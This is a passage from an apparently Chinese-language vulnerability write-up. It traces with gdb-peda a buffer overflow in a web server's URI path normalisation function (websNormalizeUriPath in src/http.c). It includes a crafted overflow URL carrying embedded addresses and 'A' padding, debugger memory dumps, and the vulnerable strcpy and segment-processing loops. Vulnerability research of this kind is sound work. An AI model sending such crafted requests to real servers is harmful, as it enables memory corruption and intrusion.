0008|&nbsp;0xbffff264&nbsp;--&gt;&nbsp;0xbffff2c0&nbsp;--&gt;&nbsp;0x805bcc0&nbsp;--&gt;&nbsp;0x805792f&nbsp;--&gt;&nbsp;0x0&nbsp;
0012|&nbsp;0xbffff268&nbsp;--&gt;&nbsp;0x0&nbsp;
0016|&nbsp;0xbffff26c&nbsp;--&gt;&nbsp;0xbffff2ac&nbsp;--&gt;&nbsp;0xb7fc94e1&nbsp;(&quot;localhost&quot;)
0020|&nbsp;0xbffff270&nbsp;--&gt;&nbsp;0xbffff2b8&nbsp;--&gt;&nbsp;0x805c70e&nbsp;--&gt;&nbsp;0x0&nbsp;
0024|&nbsp;0xbffff274&nbsp;--&gt;&nbsp;0xbffff2b4&nbsp;--&gt;&nbsp;0x805bcc0&nbsp;--&gt;&nbsp;0x805792f&nbsp;--&gt;&nbsp;0x0&nbsp;
0028|&nbsp;0xbffff278&nbsp;--&gt;&nbsp;0xbffff2bc&nbsp;--&gt;&nbsp;0x805c1e4&nbsp;--&gt;&nbsp;0x782e&nbsp;(&#39;.x&#39;)
[------------------------------------------------------------------------------]
Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value
Breakpoint&nbsp;2,&nbsp;0xb7fb61be&nbsp;in&nbsp;websUrlParse&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;url=0x805d8ac&nbsp;&quot;/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;154&nbsp;times&gt;...,&nbsp;pbuf=0xbffff2c0,&nbsp;pprotocol=0x0,&nbsp;phost=0xbffff2ac,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;pport=0xbffff2b8,&nbsp;ppath=0xbffff2b4,&nbsp;pext=0xbffff2bc,&nbsp;preference=0x0,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;pquery=0xbffff2b0)&nbsp;at&nbsp;src/http.c:3162
3162&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
gdb-peda$&nbsp;x/10x&nbsp;*0xbffff2b4
0x805bcc0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805792f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805792f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff298&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805793f
0x805bcd0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141
0x805bce0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，此时已经覆盖上畸形变量了，bffff2b4存放的是path地址，接下来返回后，path会继续传入到漏洞函数中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
gdb-peda$&nbsp;
[-------------------------------------code-------------------------------------]
&nbsp;&nbsp;&nbsp;0xb7fb8aa1&nbsp;&lt;websPump+4577&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;js&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xb7fb8cca&nbsp;&lt;websPump+5130&gt;
&nbsp;&nbsp;&nbsp;0xb7fb8aa7&nbsp;&lt;websPump+4583&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;esp,0xc
&nbsp;&nbsp;&nbsp;0xb7fb8aaa&nbsp;&lt;websPump+4586&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp+0x30]
=&gt;&nbsp;0xb7fb8aae&nbsp;&lt;websPump+4590&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0xb7fad160&nbsp;&lt;websNormalizeUriPath@plt&gt;
&nbsp;&nbsp;&nbsp;0xb7fb8ab3&nbsp;&lt;websPump+4595&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;edi,DWORD&nbsp;PTR&nbsp;[esp+0xc0]
&nbsp;&nbsp;&nbsp;0xb7fb8aba&nbsp;&lt;websPump+4602&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x10
&nbsp;&nbsp;&nbsp;0xb7fb8abd&nbsp;&lt;websPump+4605&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;eax,eax
&nbsp;&nbsp;&nbsp;0xb7fb8abf&nbsp;&lt;websPump+4607&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[edi+0x16c],eax
Guessed&nbsp;arguments:
arg[0]:&nbsp;0x805bcc0&nbsp;--&gt;&nbsp;0x805792f&nbsp;--&gt;&nbsp;0x0&nbsp;
[------------------------------------stack-------------------------------------]
0000|&nbsp;0xbffff280&nbsp;--&gt;&nbsp;0x805bcc0&nbsp;--&gt;&nbsp;0x805792f&nbsp;--&gt;&nbsp;0x0&nbsp;
0004|&nbsp;0xbffff284&nbsp;--&gt;&nbsp;0xb7fdb948&nbsp;--&gt;&nbsp;0xb7fa8000&nbsp;--&gt;&nbsp;0x464c457f&nbsp;
0008|&nbsp;0xbffff288&nbsp;--&gt;&nbsp;0xb7fc03c5&nbsp;(&lt;websGetLogLevel+5&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;ecx,0x180bb)
0012|&nbsp;0xbffff28c&nbsp;--&gt;&nbsp;0xb7fb8a40&nbsp;(&lt;websPump+4480&gt;:&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;eax,0x2)
0016|&nbsp;0xbffff290&nbsp;--&gt;&nbsp;0xbffff2f0&nbsp;--&gt;&nbsp;0xb7faa608&nbsp;--&gt;&nbsp;0x675f5f00&nbsp;(&#39;&#39;)
0020|&nbsp;0xbffff294&nbsp;--&gt;&nbsp;0xb7eec450&nbsp;--&gt;&nbsp;0x80618a8&nbsp;--&gt;&nbsp;0x0&nbsp;
0024|&nbsp;0xbffff298&nbsp;--&gt;&nbsp;0x10&nbsp;
0028|&nbsp;0xbffff29c&nbsp;--&gt;&nbsp;0x2008&nbsp;
gdb-peda$&nbsp;x/10x&nbsp;0x0805bcc0
0x805bcc0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805792f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805792f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff298&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805793f
0x805bcd0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141
0x805bce0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来，进入到漏洞函数开始分析漏洞的成因。首先根据源码，找到了一处strcpy函数。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((dupPath&nbsp;=&nbsp;walloc(len&nbsp;+&nbsp;2))&nbsp;==&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;NULL;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;strcpy(dupPath,&nbsp;pathArg);
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里会将畸形字符串考入dupPath中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
gdb-peda$&nbsp;x/10x&nbsp;0x0805bcc0
0x805bcc0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805792f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805792f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff298&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805793f
0x805bcd0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141
0x805bce0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141
[-------------------------------------code-------------------------------------]
&nbsp;&nbsp;&nbsp;0xb7fb6445&nbsp;&lt;websRewriteRequest+229&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;0xb7fb6432&nbsp;&lt;websRewriteRequest+210&gt;
&nbsp;&nbsp;&nbsp;0xb7fb6447:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;esi,esi
&nbsp;&nbsp;&nbsp;0xb7fb6449:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;edi,[edi+eiz*1+0x0]
=&gt;&nbsp;0xb7fb6450&nbsp;&lt;websNormalizeUriPath&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;ebp
&nbsp;&nbsp;&nbsp;0xb7fb6451&nbsp;&lt;websNormalizeUriPath+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;edi
&nbsp;&nbsp;&nbsp;0xb7fb6452&nbsp;&lt;websNormalizeUriPath+2&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;esi
&nbsp;&nbsp;&nbsp;0xb7fb6453&nbsp;&lt;websNormalizeUriPath+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;ebx
&nbsp;&nbsp;&nbsp;0xb7fb6454&nbsp;&lt;websNormalizeUriPath+4&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0xb7fae4a0&nbsp;&lt;__x86.get_pc_thunk.bx&gt;
[------------------------------------------------------------------------------]
Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value
Breakpoint&nbsp;4,&nbsp;websNormalizeUriPath&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;pathArg=0x805bcc0&nbsp;&quot;/y\005\b/y\005\b\230\362\377\277?y\005\b&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;184&nbsp;times&gt;...)&nbsp;at&nbsp;src/http.c:3170
3170&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
gdb-peda$&nbsp;x/10x&nbsp;0x0805bcc0
0x805bcc0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805792f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805792f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff298&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805793f
0x805bcd0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141
0x805bce0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141
gdb-peda$&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;strcpy(dupPath,&nbsp;pathArg);
[-------------------------------------code-------------------------------------]
&nbsp;&nbsp;&nbsp;0xb7fb64a8&nbsp;&lt;websNormalizeUriPath+88&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;esi
&nbsp;&nbsp;&nbsp;0xb7fb64a9&nbsp;&lt;websNormalizeUriPath+89&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;esi,DWORD&nbsp;PTR&nbsp;[esp+0x20]
&nbsp;&nbsp;&nbsp;0xb7fb64ad&nbsp;&lt;websNormalizeUriPath+93&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;esi
=&gt;&nbsp;0xb7fb64ae&nbsp;&lt;websNormalizeUriPath+94&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0xb7fad8c0&nbsp;&lt;strcpy@plt&gt;
&nbsp;&nbsp;&nbsp;0xb7fb64b3&nbsp;&lt;websNormalizeUriPath+99&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;eax,[edi*4+0x4]
&nbsp;&nbsp;&nbsp;0xb7fb64ba&nbsp;&lt;websNormalizeUriPath+106&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp],eax
&nbsp;&nbsp;&nbsp;0xb7fb64bd&nbsp;&lt;websNormalizeUriPath+109&gt;:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0xb7fad9b0&nbsp;&lt;malloc@plt&gt;
&nbsp;&nbsp;&nbsp;0xb7fb64c2&nbsp;&lt;websNormalizeUriPath+114&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x10
gdb-peda$&nbsp;x/10x&nbsp;$esp
0xbffff230:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805c720&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805bcc0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805c1e6
0xbffff240:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805d8ac&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xb7faa388&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xb7fb5fd9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xb7fd8480
0xbffff250:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805ddd3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805c720
gdb-peda$&nbsp;x/10x&nbsp;0x0805bcc0
0x805bcc0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805792f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805792f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff298&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805793f
0x805bcd0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141
0x805bce0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41414141
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来会进入两处for循环，会对路径进行一些处理，比如将/./合并等等，在第二处for循环中，由于输入和输出长度变量没有对称，导致拷贝中可以构成一个超长字符串，下面动态来观察这一过程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
&nbsp;&nbsp;&nbsp;for&nbsp;(mark&nbsp;=&nbsp;sp&nbsp;=&nbsp;dupPath;&nbsp;*sp;&nbsp;sp++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(*sp&nbsp;==&nbsp;&#39;/&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*sp&nbsp;=&nbsp;&#39;\0&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(sp[1]&nbsp;==&nbsp;&#39;/&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sp++;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;segments[nseg++]&nbsp;=&nbsp;mark;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;len&nbsp;+=&nbsp;(int)&nbsp;(sp&nbsp;-&nbsp;mark);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mark&nbsp;=&nbsp;sp&nbsp;+&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;segments[nseg++]&nbsp;=&nbsp;mark;
&nbsp;&nbsp;&nbsp;&nbsp;len&nbsp;+=&nbsp;(int)&nbsp;(sp&nbsp;-&nbsp;mark);
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(j&nbsp;=&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;nseg;&nbsp;i++,&nbsp;j++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sp&nbsp;=&nbsp;segments[i];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(sp[0]&nbsp;==&nbsp;&#39;.&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(sp[1]&nbsp;==&nbsp;&#39;\0&#39;)&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((i+1)&nbsp;==&nbsp;nseg)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;segments[j]&nbsp;=&nbsp;&quot;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j--;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;if&nbsp;(sp[1]&nbsp;==&nbsp;&#39;.&#39;&nbsp;&amp;&amp;&nbsp;sp[2]&nbsp;==&nbsp;&#39;\0&#39;)&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(i&nbsp;==&nbsp;1&nbsp;&amp;&amp;&nbsp;*segments[0]&nbsp;==&nbsp;&#39;\0&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;if&nbsp;((i+1)&nbsp;==&nbsp;nseg)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(--j&nbsp;&gt;=&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;segments[j]&nbsp;=&nbsp;&quot;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j&nbsp;=&nbsp;max(j&nbsp;-&nbsp;2,&nbsp;-1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;segments[j]&nbsp;=&nbsp;segments[i];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">上述代码就是我描述的过程，执行完处理后，看一下dp的长度。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
Breakpoint&nbsp;2,&nbsp;0xb7fb65ac&nbsp;in&nbsp;websNormalizeUriPath&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;pathArg=0x805bcc0&nbsp;&quot;/y\005\b/y\005\b\230\362\377\277?y\005\b&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;184&nbsp;times&gt;...)&nbsp;at&nbsp;src/http.c:3227
3227&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((path&nbsp;=&nbsp;walloc(len&nbsp;+&nbsp;nseg&nbsp;+&nbsp;1))&nbsp;!=&nbsp;0)&nbsp;{
gdb-peda$&nbsp;x/10x&nbsp;$esp
0xbffff230:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0000040a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805bcc0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805c1e9
0xbffff240:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805d8ac&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xb7faa388&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xb7fb5fd9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000402
0xbffff250:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805ddd6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0805c728
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里注意一下esp的值，返回中esp中存放的值是40a，也就是1034，就是缓冲区的长度，接下来到达一处非常关键的for循环。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((path&nbsp;=&nbsp;walloc(len&nbsp;+&nbsp;nseg&nbsp;+&nbsp;1))&nbsp;!=&nbsp;0)&nbsp;{
